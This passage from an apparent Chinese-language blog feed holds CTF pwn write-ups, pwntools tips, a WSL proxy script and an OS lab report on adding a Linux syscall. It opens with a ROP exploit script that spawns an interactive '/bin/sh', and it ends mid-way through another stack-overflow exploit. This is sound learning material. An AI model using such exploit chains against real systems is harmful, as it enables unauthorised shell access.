class="hljs-comment"># addr_bin_sh = 0x7fffffffd7a0</span><br>    ret = <span class="hljs-number">0x401013</span><br>    addr_data = <span class="hljs-number">0x402000</span><br>    xor_rdx_rdx = <span class="hljs-number">0x401021</span><br>    <span class="hljs-comment"># payload = p64(pop_5) + p64(ret) + p64(0) + p64(addr_bin_sh) + p64(0) + p64(59) + p64(xchg_rax_r13) + p64(addr_syscall) + b&#x27;/bin/sh\x00&#x27;</span><br>    payload = p64(ret) + p64(pop_5) + p64(addr_data) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(xchg_rax_r13) + p64(ret) + p64(addr_syscall) <br>    payload += p64(ret) + p64(pop_5) + p64(<span class="hljs-number">0</span>) + p64(addr_data) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">59</span>) + p64(ret) + p64(xchg_rax_r13) + p64(ret) + p64(xor_rdx_rdx) + p64(addr_syscall)<br><br><br><br>    <span class="hljs-comment"># pause()</span><br>    io.sendline(payload)<br><br>    <span class="hljs-comment"># pause()</span><br>    io.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="my-vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h1><blockquote><p><a href="https://www.cnblogs.com/CH13hh/p/18603549">VMpwn总结 - CH13hh - 博客园</a></p></blockquote><p><code>scanf()</code>占位符<br><code>%hd</code> short型：2字节</p><p><code>getchar()</code> 从标准输入读取单个字符</p><blockquote><p>[!tip] getchar()的作用<br>scanf的行为：<br>不会处理输入缓冲区的换行符或空白符，<br>这些字符会残留在缓冲区中，<br>而使用getchar()可用来清理换行符<code>\n</code>(残留字符)</p></blockquote><p><img src="/2024/10/29/hello-world/p/file-20250307143623331.png"><br>有canary、无pie</p><p>这题需要清晰地逆向<br><code>memory</code> ：在bss段定义的一大段内存，每个单位4字节</p><p><code>int reg[10]</code> 也是一段bss内存空间 代表寄存器</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>elf文件段</title>
    <link href="/2025/03/02/elf%E6%96%87%E4%BB%B6%E6%AE%B5/"/>
    <url>/2025/03/02/elf%E6%96%87%E4%BB%B6%E6%AE%B5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用pwntools时的语法注意点</title>
    <link href="/2025/03/02/%E4%BD%BF%E7%94%A8pwntools%E6%97%B6%E7%9A%84%E8%AF%AD%E6%B3%95%E6%B3%A8%E6%84%8F%E7%82%B9/"/>
    <url>/2025/03/02/%E4%BD%BF%E7%94%A8pwntools%E6%97%B6%E7%9A%84%E8%AF%AD%E6%B3%95%E6%B3%A8%E6%84%8F%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>p32不能操作负数<br>需要和负数 与 上 1，转化为无符号数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">var_v2 = -<span class="hljs-number">557122643</span> &amp; <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># 32位 8个F （4字节）</span><br>p32(var_v2)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>虚拟环境网络问题</title>
    <link href="/2025/03/01/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/"/>
    <url>/2025/03/01/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="wsl2联网问题"><a href="#wsl2联网问题" class="headerlink" title="wsl2联网问题"></a>wsl2联网问题</h1><p>老生常谈了，写个脚本放在<code>./scripts/proxy.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># hostip=$(cat /etc/resolv.conf | grep nameserver | awk &#x27;&#123; print $2 &#125;&#x27;)</span><br><span class="hljs-comment"># wslip=$(hostname -I | awk &#x27;&#123;print $1&#125;&#x27;)</span><br>port=7890<br><br><span class="hljs-comment"># PROXY_HTTP=&quot;http://$&#123;hostip&#125;:$&#123;port&#125;&quot;</span><br><br>PROXY_HTTP=<span class="hljs-string">&quot;http://127.0.0.1:<span class="hljs-variable">$&#123;port&#125;</span>&quot;</span><br><br><span class="hljs-function"><span class="hljs-title">set_proxy</span></span>()&#123;<br>  <span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PROXY_HTTP&#125;</span>&quot;</span><br>  <span class="hljs-built_in">export</span> HTTP_PROXY=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PROXY_HTTP&#125;</span>&quot;</span><br><br>  <span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PROXY_HTTP&#125;</span>&quot;</span><br>  <span class="hljs-built_in">export</span> HTTPS_proxy=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PROXY_HTTP&#125;</span>&quot;</span><br><br>  <span class="hljs-built_in">export</span> ALL_PROXY=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PROXY_SOCKS5&#125;</span>&quot;</span><br>  <span class="hljs-built_in">export</span> all_proxy=<span class="hljs-variable">$&#123;PROXY_SOCKS5&#125;</span><br><br>  git config --global http.https://github.com.proxy <span class="hljs-variable">$&#123;PROXY_HTTP&#125;</span><br>  git config --global https.https://github.com.proxy <span class="hljs-variable">$&#123;PROXY_HTTP&#125;</span><br><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Proxy has been opened.&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">unset_proxy</span></span>()&#123;<br>  <span class="hljs-built_in">unset</span> http_proxy<br>  <span class="hljs-built_in">unset</span> HTTP_PROXY<br>  <span class="hljs-built_in">unset</span> https_proxy<br>  <span class="hljs-built_in">unset</span> HTTPS_PROXY<br>  <span class="hljs-built_in">unset</span> ALL_PROXY<br>  <span class="hljs-built_in">unset</span> all_proxy<br>  git config --global --<span class="hljs-built_in">unset</span> http.https://github.com.proxy<br>  git config --global --<span class="hljs-built_in">unset</span> https.https://github.com.proxy<br><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Proxy has been closed.&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">test_setting</span></span>()&#123;<br>  <span class="hljs-comment"># echo &quot;Host IP:&quot; $&#123;hostip&#125;</span><br>  <span class="hljs-comment"># echo &quot;WSL IP:&quot; $&#123;wslip&#125;</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Try to connect to Google...&quot;</span><br>  resp=$(curl -I -s --connect-timeout 5 -m 5 -w <span class="hljs-string">&quot;%&#123;http_code&#125;&quot;</span> -o /dev/null www.google.com)<br>  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;resp&#125;</span> = 200 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Proxy setup succeeded!&quot;</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Proxy setup failed!&quot;</span><br>  <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&quot;set&quot;</span> ]<br><span class="hljs-keyword">then</span><br>  set_proxy<br><br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&quot;unset&quot;</span> ]<br><span class="hljs-keyword">then</span><br>  unset_proxy<br><br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&quot;test&quot;</span> ]<br><span class="hljs-keyword">then</span><br>  test_setting<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unsupported arguments.&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./proxy.sh <span class="hljs-built_in">set</span> <br></code></pre></td></tr></table></figure><p>即可自动配置代理</p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OS实验一</title>
    <link href="/2025/03/01/OS%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/2025/03/01/OS%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>实验内容：</th></tr></thead><tbody><tr><td>1.     在Linux&#x2F;OpenEuler&#x2F;OpenKylin系统中，增加一个系统调用&#x2F;或内核模块，鼓励程序逻辑的多样化<br><br>2.     撰写一个应用测试程序调用该系统调用&#x2F;测试该内核模块<br><br>3.     使用trace&#x2F;ptrace&#x2F;strace，或类似的系统跟踪工具来对该测试程序进行跟踪调试<br><br>4.     附加：在指定的国产OS上，安装一个KVM，或Xen，再装一个guestOS，体会一下，或学习使用容器。</td></tr></tbody></table><hr><p>任务4交由队友完成</p><h1 id="在Linux系统中增加一个系统调用"><a href="#在Linux系统中增加一个系统调用" class="headerlink" title="在Linux系统中增加一个系统调用"></a>在Linux系统中增加一个系统调用</h1><blockquote><p>参考资料：<br>《操作系统概念》原书第9版<br> <a href="https://zhuanlan.zhihu.com/p/487648323">给 Linux 内核添加自己定义的系统调用 - 知乎</a><br> <a href="https://blog.csdn.net/qq_41175905/article/details/80529245">操作系统作业：给linux系统增加一个系统调用_为linux内核增加系统调用systest( )-CSDN博客</a></p></blockquote><p><strong>系统调用</strong>是操作系统提供给应用程序的接口，是由操作系统开发者定义在内核之中。所以我们可以自己编译内核并且注册自己的系统调用</p><p>添加系统调用需要在内核源码中操作，所以需要先下载一份内核源码，然后注册好系统调用之后把自己修改好的内核加载到系统中。</p><hr><p>PS：由于我的虚拟机性能非常拉跨，平时对Linux的使用主要是wsl而非VMVare，所以这次使用也遇到并解决了一些使用过程中的问题<br>VMVare联网问题<br><a href="https://www.cnblogs.com/whc1/p/17605428.html">VMware使用时无法连接网络的问题 - sunny-JJ - 博客园</a></p><p>鼠标消失解决方法<br><a href="https://blog.csdn.net/u012915636/article/details/137169474">QA：ubuntu22.04.4桌面版虚拟机鼠标丢失的解决方法_虚拟机鼠标不见了怎么办-CSDN博客</a></p><p>在VMVare中使用主机VPN<br><a href="https://blog.csdn.net/nomoremorphine/article/details/138738065">VMware Ubuntu虚拟 机 使用主机VPN 配置（简单、可行）-CSDN博客</a></p><hr><h2 id="第1步-下载一份内核源码"><a href="#第1步-下载一份内核源码" class="headerlink" title="第1步 下载一份内核源码"></a>第1步 下载一份内核源码</h2><p><img src="/2024/10/29/hello-world/0250301160352064.png"></p><p>切换到root用户<br>查看内核版本<br><img src="/2024/10/29/hello-world/0250301162335707.png"><br>可见，<br>我采用的系统是Ubuntu22.04.1<br>内核版本是6.5.0-14-generic<br>体系结构为x86_64</p><hr><p>安装vim（编辑器）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt-get install vim<br></code></pre></td></tr></table></figure><hr><p>查看当前的内核版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><hr><hr><p>下载Linux内核<br><img src="/2024/10/29/hello-world/0250301201645726.png"><br><img src="/2024/10/29/hello-world/0250301201718180.png"></p><p>移动文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> linux-6.5.tar.xz /usr/src/<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301202429842.png"></p><p>解压缩</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -xvf linux-6.5.tar.xz<br></code></pre></td></tr></table></figure><p>解压缩完成<br><img src="/2024/10/29/hello-world/0250301202842877.png"><br>好了，已经成功一半哩（）</p><hr><h2 id="第2步-注册系统调用号"><a href="#第2步-注册系统调用号" class="headerlink" title="第2步 注册系统调用号"></a>第2步 注册系统调用号</h2><p>在Linux中，每个系统调用都被赋予了一个系统调用号。这样，通过这个独一无二的号就可以关联系统调用！<br><strong>内核</strong>记录了所有已注册过的系统调用号，存储在<code>sys_call_table</code>中<br>所以，我们首先要注册一个系统调用号：在系统调用表中填入对应的信息</p><p>在<code>x86_64</code>体系结构中，这个表在<code>arch/x86/entry/syscalls/syscall_64.tbl</code>中定义</p><p>系统调用表的每一项的组成：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">number</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">abi</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">point</span>&gt;</span><br><br>系统调用号 ABI 系统调用名字 系统调用在内核的接口函数<br></code></pre></td></tr></table></figure><hr><p>注：要用sudo才有修改权限<br><img src="/2024/10/29/hello-world/0250301205910617.png"><br>在<code>syscall_64.tbl</code>中添加如下：<br><img src="/2024/10/29/hello-world/0250301205314919.png"></p><p>OK了，现在下一步</p><hr><h2 id="第3步-声明系统调用函数原型"><a href="#第3步-声明系统调用函数原型" class="headerlink" title="第3步 声明系统调用函数原型"></a>第3步 声明系统调用函数原型</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/src/linux-6.5/arch/x86/include/asm/<br><span class="hljs-built_in">sudo</span> vim syscalls.h<br></code></pre></td></tr></table></figure><p>添加：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs h">asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">sys_hello_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301211716868.png"></p><hr><h2 id="第4步-添加系统调用函数的定义"><a href="#第4步-添加系统调用函数的定义" class="headerlink" title="第4步 添加系统调用函数的定义"></a>第4步 添加系统调用函数的定义</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/src/linux-6.5/kernel<br><span class="hljs-built_in">sudo</span> vim sys.c<br></code></pre></td></tr></table></figure><p>在末尾加入函数声明：(不要有中文字符)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE0(hello_system)&#123;<br>    printk(<span class="hljs-string">&quot;Hello,system! Hello world!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250302111152782.png"></p><hr><h2 id="第5步-编译并安装此内核"><a href="#第5步-编译并安装此内核" class="headerlink" title="第5步 编译并安装此内核"></a>第5步 编译并安装此内核</h2><p>在此之前，需要先安装一些工具：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt-get install build-essential libncurses5-dev<br><span class="hljs-built_in">sudo</span> apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison dwarves<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301220934513.png"></p><p>前往linux-6-5目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/src/linux-6.5<br></code></pre></td></tr></table></figure><p>清理配置文件、编译残留</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make mrproper<br></code></pre></td></tr></table></figure><p>配置内核</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make clean<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make menuconfig<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301221210749.png"><br><img src="/2024/10/29/hello-world/0250301221654970.png"><br><img src="/2024/10/29/hello-world/0250301221718678.png"><br><img src="/2024/10/29/hello-world/0250301221902580.png"></p><p>要做的事：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 禁用模块签名验证</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_MODULE_SIG=y/CONFIG_MODULE_SIG=n/&#x27;</span> .config<br><br><span class="hljs-comment"># 清空证书路径</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_SYSTEM_TRUSTED_KEYS=.*/CONFIG_SYSTEM_TRUSTED_KEYS=&quot;&quot;/&#x27;</span> .config<br><br><span class="hljs-comment"># 禁用吊销列表功能</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_SYSTEM_REVOCATION_KEYS=.*/CONFIG_SYSTEM_REVOCATION_KEYS=&quot;&quot;/&#x27;</span> .config<br><br><span class="hljs-comment"># 可选：禁用模块签名吊销检查</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_MODULE_SIG_ALL=y/CONFIG_MODULE_SIG_ALL=n/&#x27;</span> .config<br><br><span class="hljs-comment"># 重新编译</span><br><span class="hljs-built_in">sudo</span> make clean <br></code></pre></td></tr></table></figure><p>编译内核</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make ARCH=x86_64 bzImage -j4<br><span class="hljs-built_in">sudo</span> make ARCH=x86_64 modules -j4<br></code></pre></td></tr></table></figure><p>安装内核模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make ARCH=x86_64 modules_install<br></code></pre></td></tr></table></figure><p>安装内核</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make ARCH=x86_64 install<br></code></pre></td></tr></table></figure><p>重启系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure><hr><h2 id="重启后换核"><a href="#重启后换核" class="headerlink" title="重启后换核"></a>重启后换核</h2><p><img src="/2024/10/29/hello-world/0250302143519448.png"></p><h2 id="验证新内核"><a href="#验证新内核" class="headerlink" title="验证新内核"></a>验证新内核</h2><hr><h2 id="UUID问题"><a href="#UUID问题" class="headerlink" title="UUID问题"></a>UUID问题</h2><p>查看根分区的UUID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> blkid<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/dev/sda3: <span class="hljs-attribute">UUID</span>=<span class="hljs-string">&quot;ae8373b2-5980-4cca-a4f3-bb7630f25b9a&quot;</span> <span class="hljs-attribute">BLOCK_SIZE</span>=<span class="hljs-string">&quot;4096&quot;</span> <span class="hljs-attribute">TYPE</span>=<span class="hljs-string">&quot;ext4&quot;</span> <span class="hljs-attribute">PARTUUID</span>=<span class="hljs-string">&quot;c33c455f-21b4-4fff-a7c2-2cff5b5e4e1c&quot;</span><br><br></code></pre></td></tr></table></figure><p>mount命令确认挂载情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">mount | grep <span class="hljs-string">&quot; on / &quot;</span><br></code></pre></td></tr></table></figure><p>拿到正确的根分区UUID</p><p>检查并修改&#x2F;etc&#x2F;fstab</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> vim /etc/fstab<br></code></pre></td></tr></table></figure><p>列出所有已安装的内核映像及其版本号</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">dpkg --list | grep linux-image<br></code></pre></td></tr></table></figure><p>列出所有已安装的内核版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">ls</span> /boot/vmlinuz*<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> update-initramfs -c -k 6.5.0NewKernel<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> update-grub<br><br><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure><hr><h1 id="编写测试程序调用系统调用"><a href="#编写测试程序调用系统调用" class="headerlink" title="编写测试程序调用系统调用"></a>编写测试程序调用系统调用</h1><h2 id="找一个目录编写测试程序："><a href="#找一个目录编写测试程序：" class="headerlink" title="找一个目录编写测试程序："></a>找一个目录编写测试程序：</h2><p><code>testSyscall.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">long</span> res = <span class="hljs-number">0</span>;<br>res = syscall(<span class="hljs-number">548</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The syscall returned %ld\n&quot;</span>, res);<br><span class="hljs-keyword">if</span>(res == <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A successful system call!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250302111546751.png"></p><p>运行结果：<br><img src="/2024/10/29/hello-world/0250302111419681.png"></p><hr><h1 id="对测试程序跟踪调试"><a href="#对测试程序跟踪调试" class="headerlink" title="对测试程序跟踪调试"></a>对测试程序跟踪调试</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strace testSyscall<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strace -e hello_system testSyscall<br></code></pre></td></tr></table></figure><blockquote><p>[!tip] 心得体会：<br>本次OS实验的编程并不复杂，困难的地方在于对于初次接触系统内核的我们来说，整个下载、编写、配置、编译、安装的过程非常繁琐，其中配置、编译、安装过程有着许多细节，很容易有报错，需要的是能耐着性子把它们一一解决，通过对操作系统内核源码的手动编写和编译安装，我对操作系统的内核和系统调用的认识从陌生变得熟悉，更加深刻得了解了操作系统的工作原理。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>apoorvctf_wp</title>
    <link href="/2025/03/01/apoorvctf_wp/"/>
    <url>/2025/03/01/apoorvctf_wp/</url>
    
    <content type="html"><![CDATA[<h1 id="kogarashicafe-the-first"><a href="#kogarashicafe-the-first" class="headerlink" title="kogarashicafe - the first"></a>kogarashicafe - the first</h1><p>栈溢出 + 基本ROP</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span 